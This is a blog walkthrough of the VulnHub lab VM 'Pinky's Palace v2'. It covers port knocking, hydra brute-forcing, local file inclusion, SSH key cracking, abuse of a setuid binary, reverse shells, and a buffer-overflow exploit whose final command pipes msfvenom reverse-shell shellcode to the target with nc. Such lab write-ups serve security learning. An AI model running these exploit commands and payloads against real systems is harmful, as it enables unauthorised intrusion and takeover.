---
layout: post
date: 2018-04-29 15:03:40 +0000
title: "A Pink Dungeon"
category: Walkthrough
tags: [VulnHub, "Pinky's Palace"]
comments: true
image:
  feature: ponder.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/the-pink-panther-drink-alcohol-1653913/
---

This post documents the complete walkthrough of Pinky's Palace: v2, a boot2root [VM][1] created by [Pink_Panther][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

A realistic and ***hellish*** (emphasis mine) boot2root. The goal is to gain `root` access and read `/root/root.txt`. Remember to map `pinkydb` to the assigned IP address through `/etc/hosts`.

### Information Gathering

My usual practice is to start with a `nmap` scan to establish the services available in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT      STATE    SERVICE REASON         VERSION
80/tcp    open     http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown no-response
7654/tcp  filtered unknown no-response
31337/tcp filtered Elite   no-response
```

`nmap` finds one open port `tcp/80` and no SSH service although the rest of the filtered ports may prove interesting later.

### Directory/File Enumeration

I use `wfuzz` with `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) to fuzz the directories and/or files; I find two WordPress installations and the presence of one interesting directory `/secret` in the host.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 http://pinkydb/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.10.130/FUZZ
Total requests: 20469

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000015:  C=403     11 L	      32 W	    298 Ch	  ".htaccess"
000016:  C=403     11 L	      32 W	    298 Ch	  ".htpasswd"
016077:  C=301      9 L	      28 W	    317 Ch	  "secret"
016215:  C=403     11 L	      32 W	    302 Ch	  "server-status"
019909:  C=301      9 L	      28 W	    320 Ch	  "wordpress"
019949:  C=301      9 L	      28 W	    319 Ch	  "wp-admin"
019953:  C=301      9 L	      28 W	    321 Ch	  "wp-content"
019965:  C=301      9 L	      28 W	    322 Ch	  "wp-includes"
```

I see a text file at `http://pinkydb/secret/bambam.txt`, when I navigate to `/secret`, with the following contents.

```
# curl http://pinkydb/secret/bambam.txt
8890
7000
666

pinkydb
```
### WordPress

Since there is WordPress installed in `pinkydb`, let's use `wpscan` to scan for WordPress vulnerabilities, if any.

```
# wpscan --url pinkydb --enumerate u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://pinkydb/
[+] Started: Fri Apr 27 02:19:10 2018
...
[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+
```

I spotted non-English words while I was skimming through the blog. Based on experience, there's a good chance one of these words is a password, and this is an opportunity to build a custom wordlist with `cewl` for a dictionary attack. It's a pity none of the words yields any results for the WordPress login.

```
# cewl -m3 pinkydb 2>/dev/null | sed 1d | tee cewl.txt
# john --rules --wordlist=cewl.txt --stdout | tee wordlist.txt
```

### Knock Knock. Who's There?

Looking at the numbers in `bambam.txt`, and if I've to guess, I'm probably looking at port numbers (`0-65535`) and that means port-knocking is in the works.

To that end, I wrote a port-knocking script, `knock.sh` using `nmap`.

{% highlight bash linenos %}
#!/bin/bash

TARGET=$1

for ports in $(cat sequence.txt); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
    done
    sleep 3
    nmap -n -v -Pn -p- -A --reason $TARGET -oN ${ports}.txt
done
{% endhighlight %}

`sequence.txt` is a text file containing all the permutations of `8890,7000,666` and you can use the following Python code to generate it.

```
python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq > sequence.txt
```

When `knock.sh` reaches the sequence `7000,666,8890`, it unlocks three more services, including the familiar SSH service.

```
# ./knock.sh 192.168.10.130
[*] Trying sequence 7000,666,8890...
...
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
7654/tcp  open  http    syn-ack ttl 64 nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?  syn-ack ttl 64
| fingerprint-strings:
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   NULL:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|_    into Pinky's Palace.
```

Now that I've determined the correct sequence to unlock those ports, I can always use `nmap` to unlock them again.

```
# for p in 7000 666 8890; do nmap -n -v0 -Pn --max-retries 0 -p $p 192.168.10.130; done
```

The service at `tcp/7654` appears to be running `nginx`, while the service at `tcp/31337` appears to be `echo`ing whatever that's thrown at it.

### Pinky's Database

The page at `http://pinkydb:7654/login.php` appears to be the login to Pinky's database — the first attack surface.

![screenshot-1](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-1.png)

Remember the custom wordlist we built earlier? Perhaps we can use it with `hydra` and see what we get?

```
# echo pinky > usernames.txt
# echo pinky1337 >> usernames.txt
# hydra -L usernames.txt -P wordlist.txt -o hydra.txt -s 7654 pinkydb http-post-form /login.php:user=^USER^&pass=^PASS^:Invalid
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
[7654][http-post-form] host: pinkydb   login: pinky1337   password: entry
```

I was able to log in with the credential (`pinky:Passione`).

![screenshot-2](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-2.png)

It's easy to spot the LFI vulnerability with `pageegap.php`. [Palindrome](https://en.wikipedia.org/wiki/Palindrome) anyone?

![screenshot-3](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-3.png)

With that in mind, let's see if we can make use of the vulnerability to display `/etc/passwd`.

```
# curl http://pinkydb:7654/pageegap.php?1337=/etc/passwd
root:x:0:0:root:/root:/bin/bash
...
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
demon:x:1001:1001::/home/demon:/bin/bash
stefano:x:1002:1002::/home/stefano:/bin/bash
```

`stefano` has an account in `pinkydb`. He also has his SSH private key as seen above. I guess that's an open invitation to log in to his account via SSH.

I log in to find his RSA private key protected by a password. It's not difficult to use `ssh2john` and John the Ripper to recover the password.

```
# ssh2john id_rsa > id_rsa.hash
# john --show id_rsa.hash
id_rsa:secretz101
```

With the password out of the way, it's almost trivial to log in to `stefano`'s account.

![screenshot-4](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-4.png)

### Privilege Escalation

I notice `/home/stefano/tools/qsub` and `/usr/local/bin/backup.sh` during enumeration of `stefano`'s account. I suspect they may be key pieces to the privilege escalation puzzle.

![screenshot-5](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-5.png)

![screenshot-6](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-6.png)

To read `/home/stefano/tools/qsub`, I need to be `pinky` or `www-data`. Since I don't know `pinky`'s password, the other way is to edit any of the `.php` files in `/var/www` (the home directory of `www-data`) where `stefano` has permission to write.

```
$ find /var/www -perm /o+w
/var/www/html/apache/wp-config.php
```

I edit `wp-config.php` to run a reverse shell so that I'm able to study `qsub` in greater detail.

![screenshot-7](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-7.png)

![screenshot-8](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-8.png)

I copy `qsub`, encoded in `base64`, over to my analysis machine, and decode it back to its binary form.

![screenshot-9](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-9.png)

Now that `qsub` is on my machine, I'm able to perform reverse engineering, and after stepping through the `main()` and `send()` functions:

* The program `qsub` has one argument — the message to `pinky`
* The input password is the value of the `TERM` environment variable, and must be less than or equal to forty characters
* The `send()` function is an abstraction for `/bin/echo [Message] >> /home/pinky/messages/stefano_msg.txt`

_The image shows `qsub` compares the input password with the value of the `TERM` environment variable_

![screenshot-10](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-10.png)

_The image shows `system()` library function executes shell command `/bin/echo`_

![screenshot-11](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-11.png)

Since I know how `qsub` works, and it has been `setuid` to `pinky`, I can exploit it to create `/home/pinky/.ssh/authorized_keys` with a RSA key pair I control.

The steps are slightly convoluted but the end result is deeply satisfactory:

1. Generate a RSA key pair on my machine
2. Run a `netcat` reverse shell
3. Copy and paste the RSA public key to `/home/pinky/.ssh/authorized_keys`
4. Log in to `pinky`'s account with the RSA private key

![screenshot-17](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-17.png)

![screenshot-16](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-16.png)

![screenshot-12](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-12.png)

The aim of gaining control of `pinky`'s account is so that I'm able to edit `/usr/local/bin/backup.sh`, add this line, and run a reverse shell as `demon`.

![screenshot-13](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-13.png)

On my machine, I've set up a `netcat` listener to receive the reverse shell.

![screenshot-14](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-14.png)

Now I'm able to use the same Jedi trick of copying over a RSA public key I control, log in with SSH, and take full control of `demon`'s account.

![screenshot-15](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-15.png)

The work is far from complete; the final piece of the privilege escalation puzzle is in fact `/daemon/panel`.

![screenshot-18](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-18.png)

I use `scp` to grab a copy of `/daemon/panel` to my analysis machine (it runs 64-bit Kali Linux and replicates the conditions of `pinkydb` as close as possible), and so that I'm able to analyze it with `gdb` and [PEDA](https://github.com/longld/peda). To be more precise, I run `./panel` and attach `gdb` to it.

![screenshot-19](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-19.png)

As seen above, ASLR is not disabled and the stack is executable.

Using `readelf`, I'm able to spot the `main()` function, along with the `handlecmd()` function, which I suppose handles the input provided to the program listening at `tcp/31337`.

![screenshot-20](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-20.png)

After disassembling the function with `gdb`, I place a breakpoint at `<handlecmd+70>` before the program takes back control. At this point, I'm able to analyze the stack overflow and the offset with which to control the RIP.

![screenshot-21](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-21.png)

I create a 200-byte pattern with `pattern_create`, save it to a file, and then send it over to `./panel` listening at `tcp/31337`.

![screenshot-22](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-22.png)

`gdb` pauses the program at `<handlecmd+70>`.

![screenshot-23](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-23.png)

The command `pattern_offset` finds the pattern at an offset of 120 bytes.

![screenshot-24](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-24.png)

The basic exploit structure looks like this.

`# perl -e 'print "A" x 120 . "BBBBBB"'` where `BBBBBB` is the return address we have yet to determine.

![screenshot-25](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-25.png)

Here we are, back at the breakpoint. Before `BBBBBB` returns, notice the top of the stack? We see 120 `'A'`s followed by `BBBBBB`. If we can find a return address with `jmp rsp` or `call rsp`, we are able to execute a 120-byte payload placed in the stack.

![screenshot-26](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-26.png)

Using the command `jmpcall`, we are able to pinpoint the exact address within `./panel` that has a `call rsp`. This is our return address.

We proceed to generate a payload with `msfvenom`. I prefer to use a single-stage reverse shell as the payload to a multi-stage one. Although single-stage payload has a bigger size, it gets everything done in shorter time.

![screenshot-27](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-27.png)

The generated payload is 119 bytes, and fits in nicely onto the given 120 bytes of space with one byte to spare :smirk:

### Getting to the `root` of the matter

The stage is now set for the real privilege escalation.

```
# perl -e 'print "\x90" . "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xd7\x5f\x69\x30\xa9\x2d\x85\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbd\x76\x31\xa9\xc3\x2f\xda\x74\xd6\x01\x66\x35\xe1\xba\xcd\xa7\xd5\x5f\x78\x6c\x69\x85\x8f\x9e\x86\x17\xe0\xd6\xc3\x3d\xdf\x74\xfd\x07\x66\x35\xc3\x2e\xdb\x56\x28\x91\x03\x11\xf1\x22\x80\x6b\x21\x35\x52\x68\x30\x65\x3e\x31\xb5\x36\x07\x1f\xda\x45\x85\x4d\x9f\xd6\x8e\x62\xfe\x65\x0c\xf8\xd8\x5a\x69\x30\xa9\x2d\x85\x1e" . "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
```

On my `netcat` listener, a `root` shell appears.

![screenshot-28](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-28.png)

With a bunch of keystrokes to get a better looking shell; the flag is basically there for the taking.

![screenshot-29](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-29.png)

:dancer:

### Afterthought

To be honest, I thought Pinky's Palace was a misnomer; it should be Pinky's Dungeon instead :sweat_smile:

Walking through this VM took longer than usual because of the twists and turns. I had to document down the crucial sections and took more screen captures. It certainly lived up to its name of being harder than the first one, with the reverse engineering of `qsub`, and the exploit development for `panel`.

I give it a :+1:

[1]: https://www.vulnhub.com/entry/pinkys-palace-v2,229/
[2]: https://twitter.com/@Pink_P4nther
[3]: https://www.vulnhub.com

*[ASLR]: Address Space Layout Randomization
*[LFI]: Local File Inclusion
*[RSA]: Rivest-Shamir-Adleman
*[SSH]: Secure Shell
